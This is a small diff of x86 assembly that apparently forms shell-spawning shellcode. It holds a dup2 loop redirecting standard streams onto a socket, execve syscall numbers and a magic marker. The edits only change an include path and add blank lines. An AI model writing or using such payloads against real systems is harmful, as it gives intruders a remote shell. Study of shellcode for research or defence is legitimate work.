@@ -3,7 +3,7 @@
 	;; Mon Mar  4 12:03:49 EST 2013
 	;; EBX, ECX, EDX, ??? then stack - but we only need 3		
 	;; read = 3, dup2 = 63, execve = 11
-	%include "../include/short32.s"
+	%include "short32.s"
 
 	%define MAGIC dword 0xcafef00d
 BITS 32
@@ -50,6 +50,8 @@ mydup2:
 	int 0x80
 	dec ecx    	; this is for looping stderr/out/in
 	jns mydup2.copy
+
+	
 
 	;; OUR SOCKET IS IN EBX
 	
